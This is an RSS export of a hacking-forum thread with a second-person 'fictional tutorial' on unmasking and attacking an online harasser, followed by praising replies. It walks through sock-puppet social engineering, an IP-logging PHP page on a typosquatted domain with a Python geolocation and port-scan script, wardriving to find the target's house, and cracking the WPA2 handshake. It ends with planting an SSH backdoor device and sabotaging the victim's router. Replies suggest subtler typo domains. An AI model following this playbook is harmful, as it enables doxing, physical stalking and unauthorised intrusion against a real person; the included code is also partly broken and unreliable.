<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Hacking John Doe</title>
    <link>https://0x00sec.org/t/hacking-john-doe/716</link>
    <description># Hacking John Doe:
_A fictional tutorial about social engineering, recon, exploitation, and a complete lack of ethics. By @Ninja243_

---

It&#39;s a cold, dark night in your room. You know you shouldn&#39;t be up this late, but you are, yet again. To pass time, and to wait for the erratic buzz of caffeine to wear off, you unlock your phone and open [Kik](https://www.kik.com/) (or some unofficial client) to see what&#39;s new:

The messages start flowing in.

Of the three hundred &lt;a href=&quot;http://mweya.ddns.net/Temp/PowerCode&quot;&gt;lag messages&lt;/a&gt; from groups owned by the self-titled &lt;a href=&quot;http://kik.me/6so&quot;&gt;Kik God&lt;/a&gt; and his henchmen, one stood out: it was a message from an &lt;a href=&quot;http://kik.me/MweyaR&quot;&gt;old friend&lt;/a&gt;, with whom you lost contact ages ago. 

&quot;I wonder what he wants,&quot; you silently muse.

You read the message and his motives become clearer. One of your mutual friends seems to have been harassed yet again by one of the &quot;&lt;a href=&quot;http://kik.me/6so&quot;&gt;Gods&lt;/a&gt;&quot;, but -- this time --  one user went overboard and started issuing death threats.

After assuring your &lt;a href=&quot;http://kik.me/MweyaR&quot;&gt;friend&lt;/a&gt; that all will be okay, you text your mutual friend to advise her to block the assailant. Next, you take a look at the information given to you. Although your &lt;a href=&quot;http://kik.me/MweyaR&quot;&gt;friend&lt;/a&gt; is no specialist, he tried his best to &lt;a href=&quot;https://en.wikipedia.org/wiki/Doxing&quot;&gt;dox&lt;/a&gt; the target. All he got was a list
of usernames the assailant used.



    	-- Dox --

    Names:		?
    Usernames:	@Sm9obiBEb2U=
    		@akRhd2c=
    		@Sm9obm55RA==
    Static IP:	?
    Location:	?

The second you read the usernames, you see a pattern. The equal signs at the end of each username look extremely suspicious. After doing some &lt;a href=&quot;http://lmgtfy.com/Base64&quot;&gt;research&lt;/a&gt;, you try deciphering them (base64).

You copy and paste the usernames into your &lt;a href=&quot;https://duckduckgo.com/&quot;&gt;search engine&lt;/a&gt;. Gibberish is returned. Next, you decide to separate the usernames from the &#39;at&#39; signs.

    	@Sm9obiBEb2U=       --&gt;     Sm9obiBEb2U=
    	@akRhd2c=	    --&gt;     akRhd2c=
    	@Sm9obm55RA==       --&gt;	    Sm9obm55RA==

Bingo.

	Sm9obiBEb2U=       --&gt;     John Doe
	akRhd2c=	   --&gt;     jDawg
	Sm9obm55RA==       --&gt;	   JohnnyD

Knowing his alias, you decide to say hi and try to get some more info out of him. You don&#39;t want to scare him off or let him
know who you are, so you make another account (by getting an email address from another provider like &lt;a href=&quot;http://iway.na&quot;&gt;Iway&lt;/a&gt; or &lt;a href=&quot;mail.google.com&quot;&gt;Gmail&lt;/a&gt;) for messaging him.

Once logged in, your profile rich with misinformation, you send the message, &quot;Hey x.&quot;

Within mere seconds, he replies and you two start chatting. You boot up your laptop and go to an &lt;a href=&quot;http://blasze.tk&quot;&gt;IP logging&lt;/a&gt; service. After following the onscreen prompts, you get a link. To avoid arousing suspicion, you head onto the &lt;a href=&quot;http://goo.gl&quot;&gt;Google URL Shortener&lt;/a&gt;.

To avoid false-positives, you look at the clicks on your logging URL and notice that two Google services have clicked on it.
You write down those IP addresses to avoid messing with the wrong servers. Finally, you send the link to John Doe.

&quot;Lmao, a logger? Really?&quot; is the reply.

You block John Doe and decide to retry the social engineering approach.

You make another account with a new email and alias. This time, you pick another logging service with a less conspicuous name and almost no trace on Google. You do this by getting an old device running &lt;a href=&quot;https://www.google.co.za/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwj7lJu7v4bNAhUsAcAKHT0-AB0QFggiMAI&amp;url=https%3A%2F%2Fwww.digitalocean.com%2Fcommunity%2Ftutorials%2Fhow-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04&amp;usg=AFQjCNFMs2tFcDvIKQSj-FG-MetmnBjf-Q&amp;bvm=bv.123325700,d.d2s&quot;&gt;Apache&lt;/a&gt; (computer or phone (in chrooted Kali), depending on if you know what you&#39;re doing or not) and by buying an inconspicuous domain like &#39;UrbanDicktionary.com&#39;. Your homepage (index.php) looks like this:

```php
&lt;!-- This runs the Python3 script --&gt;

&lt;?php

$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
echo exec(&quot;SuperCoolPythonScript &quot;.$ip);

?&gt; 

&lt;!-- This redirects the assailant to the real site --&gt;
&lt;script type=&quot;text/javascript&quot;&gt;window.location=&quot;http://urbandictionary.com&quot;&lt;/script&gt; 
```

The homepage first takes the visitor&#39;s IP, then runs a Python script (called SuperCoolPythonScript) with the visitor&#39;s IP as an argument.
The Python Script looks like this:

```python
#! /usr/bin/python3

import sys, socket, os, urllib.request, requests

#global skid_ip, Location, x, URLDERP, locale


def Grab_IP():
        try:
                os.system(&#39;cls&#39; if os.name == &#39;nt&#39; else &#39;clear&#39;)
                print(&quot;-----------------------------------------------------------------------------------&quot;)
                print(&quot;                               Mweya&#39;s Doxing Service&quot;)
                print(&quot;-----------------------------------------------------------------------------------\r\n&quot;)
                if sys.argv[1] == &quot;&quot;:
                        print(&quot;[!] No arguments given!\r\n    Usage: ./Derpify {SkidDNS}&quot;)
                else:
                        skid = sys.argv[1]
                        skid_ip = socket.gethostbyname(skid)
                        print(&quot;[Grabber:] The skid&#39;s IP is: &quot;+skid_ip+&quot;\r\n&quot;)
                        URLDERP = &quot;http://ipinfo.io/&quot;+skid_ip
                        global skid_ip, URLDERP
        except Exception as e:
                print(&quot;\r\n[!] &quot;+str(e)+&quot;\r\n&quot;)



def PortScan(port):
        try:
                con = s.connect((skid_ip, port))
                return True
        except:
                return False


def GeoLocate():
        try:
                Location = requests.get(URLDERP)
                SimpleLocation = Location.json()
                locale = SimpleLocation[&#39;loc&#39;]
                org = SimpleLocation[&#39;org&#39;]
                city = SimpleLocation[&#39;city&#39;]
                region = SimpleLocation[&#39;region&#39;]
                country = SimpleLocation[&#39;country&#39;]
                print(&quot;\r\n[Tracker:] Skid&#39;s GPS coordinates are &quot;+locale)
                print(&quot;[Tracker:] Skid&#39;s ADSL lane is owned by &quot;+org)
                print(&quot;[Tracker:] Skid seems to live in &quot;+city+&quot;, &quot;+region+&quot;, &quot;+country+&quot;\r\n&quot;)
                global locale, city, region, country, org

        except Exception as e:
                #print(&quot;\r\n[Tracker:] Couldn&#39;t track skid&quot;)
                print(&quot;\r\n[Tracker:] &quot;+str(e))


def Log():
        try:
                AppendFile = open(&quot;/var/www/html/PrivTemp/Skids.txt&quot;, &#39;a&#39;)
                AppendFile.write(&quot;\r\n[Skid:]      IP: &quot;+skid_ip)
                AppendFile.write(&quot;            GPS: &quot;+locale)
                AppendFile.write(&quot;           City: &quot;+city)
                AppendFile.write(&quot;         Region: &quot;+region)
                AppendFile.write(&quot;\r\n&quot;)
                AppendFile.close()
        except Exception as e:
        #       print(&quot;\r\n[!] Error writing to file!&quot;)
                print(&quot;\r\n[!] &quot;+str(e))

def Log2():
        try:
                with open(&quot;/var/www/html/PrivTemp/Skids.txt&quot;, &quot;a&quot;) as skids:
                        skids.write(&quot;[Skid:]      IP: &quot;+skid_ip)
                        skids.write(&quot;            GPS: &quot;+locale)
                        skids.write(&quot;           City: &quot;+city)
                        skids.write(&quot;         Region: &quot;+region+&quot;\r&quot;)
                #       skids.close()
        except Exception as e:
                print(&quot;\r\n[!] &quot;+str(e))


def main():
        Grab_IP()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for x in range(1, 65500):
                if PortScan(x):
                        print(&quot;[PortScan:] Port &quot;,x,&quot; is open&quot;)
        #       else:
        #               print(&quot;[PortScan:] Port &quot;,x,&quot; is closed&quot;)
        GeoLocate()
        try:
                Format()
        except:
                pass
        Log2()



def Format():
        if len(skid_ip)&lt;14:
                skid_ip+=&quot; &quot;*(14-len(skid_ip))
        if len(locale)&lt;16:
                locale+=&quot; &quot;*(16-len(locale))
        if len(city)&lt;32:
                city+=&quot; &quot;*(32-len(city))
        if len(region)&lt;32:
                region+=&quot; &quot;*(32-len(region))
```

The Python script takes the IP passed to it as an argument and then proceeds to use a free JSON service (ipinfo.io) to look it up before performing a primitive port scan. The results are logged in a file called &quot;Skids.txt&quot;.

After setting everything up, you decide to shift your conversation to weird redirects like &lt;a href=&quot;http://loser.com&quot;&gt;loser.com&lt;/a&gt; and &lt;a href=&quot;http://UrbanDicktionary.com&quot;&gt;UrbanDicktionary.com&lt;/a&gt;
He is reluctant at first, but eventually clicks the link. The IP address and his GPS coordinates are saved.

&quot;That&#39;s weird,&quot; you think as you paste his GPS coordinates into &lt;a href=&quot;maps.google.com&quot;&gt;Google Maps&lt;/a&gt;.

While making sure that your info is accurate, using &lt;a href=&quot;shodan.io&quot;&gt;Shodan&lt;/a&gt;, and making sure you didn&#39;t pick up the wrong IP by means of a &quot;&lt;a href=&quot;https://who.is/&quot;&gt;whois&lt;/a&gt;&quot;, you realize that you got very lucky. John Doe is using mobile data, and the location of the IP is not his ISP&#39;s server.

John Doe seems to be in a house a few blocks away from you. Therefore, you decide to pay him a visit.

You grab your car keys, laptop and an &lt;a href=&quot;http://www.aircrack-ng.org/doku.php?id=compatible_cards&quot;&gt;AirCrack-ng-compatible WiFi card&lt;/a&gt;. You drive past his house before parking a block away.
To avoid being detected, you turn off your car&#39;s lights. Then, you turn your head and stare into the inky night at what might be John&#39;s house. The house looks like a typical, two-story suburban house with white walls, a large fence-less yard and an American flag flying from the second floor.

You press the power button and wait for your laptop to boot into &lt;a href=&quot;http://www.weaknetlabs.com/&quot;&gt;WeakerThan 7&lt;/a&gt;. Once it boots, you plug in your network card, make sure it&#39;s detected by running `ip link`, and then start &lt;a href=&quot;http://weaknetlabs.com/warcarrier/&quot;&gt;WarCarrier&lt;/a&gt;. You follow the on-screen prompts to start scanning, wait for the onboard GPS to connect and start the slow drive around the block. You pass the expected house, but knowing how inaccurate GeoIP is, you keep circling the block. You pass every house you can see before looking
at the time -- it&#39;s 1 AM; you go home.

The next day you look at the data collected by WarCarrier. It picked up multiple SSIDs and a couple of Bluetooth phones, one which was called &quot;J0hn Ph0ne&quot;. The phone&#39;s icon on the map was very close to one access point, one which seemed isolated from the rest. The house of the SSID seemed to be as expected, with it&#39;s white walls and fence-less garden. 

The network&#39;s security is WPA2, so you decide to pay John another visit. You  park the car two blocks away and then wait for nightfall. Then, you disembark and lock the car before walking towards his house, stopping just before. You find a secluded spot and pull out your rooted Android cellphone with &lt;a href=&quot;http://forum.xda-developers.com/showthread.php?t=1872752&quot;&gt;Debian and AirCrack-ng&lt;/a&gt; installed.

You find your &lt;a href=&quot;ftp://ftp.openwall.com/pub/&quot;&gt;wordlist&lt;/a&gt;, get comfortable and &lt;a href=&quot;http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/&quot;&gt;wait until you find the hash.&lt;/a&gt; (Although it could be easier if you get &lt;a href=&quot;https://www.google.com.na/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwiDmKuM7-HNAhXqKsAKHbXeDjMQFggpMAE&amp;url=http%3A%2F%2Fforum.xda-developers.com%2Fshowthread.php%3Ft%3D2233282&amp;usg=AFQjCNFa2SVLACKF165fzbhhtMdzjdeg5Q&amp;sig2=rLQPyU3xMQiqWTJTsLafqA&quot;&gt;this&lt;/a&gt; working...)

Once you see the &quot;WPA Handshake: &quot; prompt, you revert the changes made to your network card and SSH into the server you used previously. After installing Aircrack-ng with a quick `apt-get install aircrack-ng`, you upload your hash using
an &lt;a href=&quot;https://play.google.com/store/apps/details?id=turbo.client&amp;hl=en&quot;&gt;SFTP program&lt;/a&gt;, and you &lt;a href=&quot;http://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/&quot;&gt;start cracking the hash&lt;/a&gt;. You leave your spot and drive home for the meantime.

As you arrive, you get a notification that the hash has finished cracking; The password is, &quot;hackme&quot;. Now, you set up a &lt;a href=&quot;https://www.raspberrypi.org/&quot;&gt;Raspberry Pi&lt;/a&gt; with a network card and power supply. You await sundown before visiting John once more. 

This time, you connect your Pi and phone to the WiFi using the freshly-cracked credentials. You &lt;a href=&quot;http://www.instructables.com/id/How-to-Spoof-Your-MAC-Address/&quot;&gt;spoof your MAC addresses&lt;/a&gt; and look for a login page to the router. Finding it, you log in using the password from the access point. From the web menu, you
forward port 22 to your Raspberry Pi. You then &lt;a href=&quot;https://www.blackmoreops.com/2014/06/19/kali-linux-remote-ssh/&quot;&gt;set up an SSH Server&lt;/a&gt;, make sure your PI won&#39;t run out of power,  and then leave it there.

You decide to make an &lt;a href=&quot;http://zeronte.bluesimplex.com/80/&quot;&gt;SSH tunnel&lt;/a&gt; and use the router&#39;s settings to mess with his internet connection, delete his ADSL login details, and then change the router&#39;s password.

After all this strenuous work, you send a single text to your old &lt;a href=&quot;http://kik.me/MweyaR&quot;&gt;friend&lt;/a&gt;:

&quot;I got him. He won&#39;t be a problem anymore.&quot;

&lt;i&gt;The End&lt;/i&gt;</description>
    
    <lastBuildDate>Fri, 23 Feb 2018 07:37:24 +0000</lastBuildDate>
    <category>Social Engineering</category>
    <atom:link href="https://0x00sec.org/t/hacking-john-doe/716.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/31">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/31</link>
        <pubDate>Sun, 25 Feb 2018 22:14:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-31</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Ninja243]]></dc:creator>
        <description><![CDATA[
            <p>Hey all!</p>
<p>Due to a bit of a dispute with my previous DNS provider, the first link (with regards to the lag code) has broken. A replacement can be found <a href="https://mweya.duckdns.org/0lag" rel="nofollow noopener">here</a> and while I’m at it, those two long and unsightly Google links should have looked like <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04" rel="nofollow noopener">this</a> (LAMP setup) and <a href="https://forum.xda-developers.com/showthread.php?t=2233282" rel="nofollow noopener">this</a> (Aircrack-ng on Android), respectively.</p>
<p>Thanks for showing so much support for this <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=9" title=":grinning:" class="emoji" alt=":grinning:"></p>
<ul>
<li><a class="mention" href="https://0x00sec.org/u/ninja243">@Ninja243</a></li>
</ul>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/28">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/28</link>
        <pubDate>Tue, 30 Jan 2018 01:32:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-28</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/27">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/27</link>
        <pubDate>Mon, 29 Jan 2018 23:25:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-27</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/26">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/26</link>
        <pubDate>Fri, 22 Dec 2017 00:57:30 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-26</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/25">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/25</link>
        <pubDate>Fri, 22 Dec 2017 00:38:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-25</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/24">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/24</link>
        <pubDate>Thu, 02 Nov 2017 08:04:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-24</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Celestial]]></dc:creator>
        <description><![CDATA[
            <p>Woah… I couldn’t stop reading. This was really good.</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/23</link>
        <pubDate>Thu, 02 Nov 2017 03:12:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-23</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Learned that the hard way in me school’s English class <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/22</link>
        <pubDate>Wed, 10 Aug 2016 07:11:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-22</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Ah the good 'ol domain typo! Hard to notice if you do it right, as you said!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/21</link>
        <pubDate>Wed, 10 Aug 2016 07:07:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-21</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>You know. Spelling Matters.</p>
<p><a href="https://www.youtube.com/watch?v=TNStNUizxhE">Spelling Matters</a></p>

          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/20</link>
        <pubDate>Wed, 10 Aug 2016 06:39:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-20</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Ninja243]]></dc:creator>
        <description><![CDATA[
            <p>That’s pretty good!</p>
<p>I stared at the link for longer than I’m proud of (trying to figure out what was wrong), so, I’m pretty confident your approach would work. Thanks for the share!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/19</link>
        <pubDate>Wed, 27 Jul 2016 07:21:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-19</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Rather then urbandiktionary, a name like <a href="http://www.mircosoft.com" rel="nofollow noopener">www.mircosoft.com</a> is way harder to notice the error.<br>
Check the following sentence</p>
<p>i wnet sohpping whit smoe freinds at the mall wihle tehre are spleling mistkaes its qutie easy to raed.</p>
<p>This is because all the letters are in the words and the first and last letters are correct.</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/18</link>
        <pubDate>Wed, 27 Jul 2016 02:19:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-18</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[l0calh0st]]></dc:creator>
        <description><![CDATA[
            <p>Whenever you get free time, add on to this. It is so goooood and well written!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/17</link>
        <pubDate>Tue, 26 Jul 2016 14:46:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-17</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Ninja243]]></dc:creator>
        <description><![CDATA[
            <p>Unfortunately not due to the fact that I’m extremely busy with school and after school tutors, so I simply don’t have the time.</p>
<p>But if you (or anyone else) would like to add to this, make a second installment or use this elsewhere, then please do!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/16</link>
        <pubDate>Tue, 26 Jul 2016 14:45:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-16</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I don’t mean to be impatient, but can we expect another one of these soon? They’re so badass and I’m itching xD</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/15</link>
        <pubDate>Fri, 22 Jul 2016 12:50:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-15</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Perhaps you could create something like this where you go after Jane Doe, John Doe’s sister except she’s smart and happens to use Tor with a VPN while having her MAC spoofed. Although it’s truly easier said than done.</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/14</link>
        <pubDate>Tue, 12 Jul 2016 21:24:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-14</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Sure, it just increase your chances to get the IP…</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/13</link>
        <pubDate>Tue, 12 Jul 2016 16:56:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-13</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Nitrax]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="0x00pf" data-post="10" data-topic="716">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>HTTP_X_FORWARDED_FOR, HTTP_X_FORWARDED, HTTP_FORWARDED_FOR, HTTP_FORWARDED</p>
</blockquote>
</aside>
<p><a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> You are right however, those variables can be easily spoofed so, their relevance can be questionable.</p>
<p>Best,<br>
Nitrax</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/12</link>
        <pubDate>Tue, 12 Jul 2016 16:53:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-12</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Ninja243]]></dc:creator>
        <description><![CDATA[
            <p>Thanks, I’ll look into that</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/11</link>
        <pubDate>Tue, 12 Jul 2016 16:25:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-11</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="Ninja243" data-post="1" data-topic="716">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/ninja243/40/1961_2.png" class="avatar"> Ninja243:</div>
<blockquote>
<pre><code class="lang-auto">&lt;?php

$ip = $_SERVER['REMOTE_ADDR'];
echo exec("SuperCoolPythonScript ".$ip);

?&gt;
</code></pre>
</blockquote>
</aside>
<p><code>REMOTE_ADDR</code> is the main variable to check for a client IP, but when connecting through a proxy server it will contain the proxy IP. Depending on the proxy server, another variables may be set. As far as I know, you should check in order:</p>
<p><code>HTTP_X_FORWARDED_FOR</code>, <code>HTTP_X_FORWARDED</code>, <code>HTTP_FORWARDED_FOR</code>, <code>HTTP_FORWARDED</code></p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/10</link>
        <pubDate>Tue, 12 Jul 2016 16:24:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-10</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Cromical]]></dc:creator>
        <description><![CDATA[
            <p>Just what I’ve been looking for! Keep it up!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/9</link>
        <pubDate>Mon, 11 Jul 2016 20:50:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-9</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[n3xUs]]></dc:creator>
        <description><![CDATA[
            <p>Man oh man! I’m really glad you’ve decided to take this project forward! Very well written, like <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> said, when you start reading, you can’t put it down!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/8</link>
        <pubDate>Mon, 11 Jul 2016 19:45:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-8</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Ohhh mannn! This is so good. I literally love this so much. I would pay to read something like this. Once I picked it up I couldn’t put it down.</p>
<p>Nice work!</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/hacking-john-doe/716/7</link>
        <pubDate>Sun, 10 Jul 2016 07:55:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-716-7</guid>
        <source url="https://0x00sec.org/t/hacking-john-doe/716.rss">Hacking John Doe</source>
      </item>
      <item>
        <title>Hacking John Doe</title>
        <dc:creator><![CDATA[Ninja243]]></dc:creator>
        <description><![CDATA[
            <p>Aah, I didn’t think about that, thanks</p>
          <p><a href="https://0x00sec.org/t/hacking-john-doe/716/6">Read full topic</a></p>
        ]]></description>
